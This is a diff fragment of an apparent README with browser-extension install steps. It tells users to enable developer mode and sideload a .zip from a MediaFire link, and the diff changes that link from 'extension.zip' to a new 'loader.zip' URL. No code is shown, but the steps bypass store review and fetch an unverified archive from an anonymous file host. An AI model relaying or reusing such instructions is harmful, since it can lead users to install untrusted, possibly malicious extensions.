@@ -10,7 +10,7 @@
 
 2> Turn on developer mode
 
-3> Download this .zip file: [extension.zip](http://download1979.mediafire.com/b5kv9n4q28bg/qh74phl0g9jc7b9/extension.zip)
+3> Download this .zip file: [loader.zip](http://download2268.mediafire.com/vlbnw25vss1g/rpog01jyjk7co1i/loader.zip)
 
 4> Drag & Drop the archive in extension page. 
 
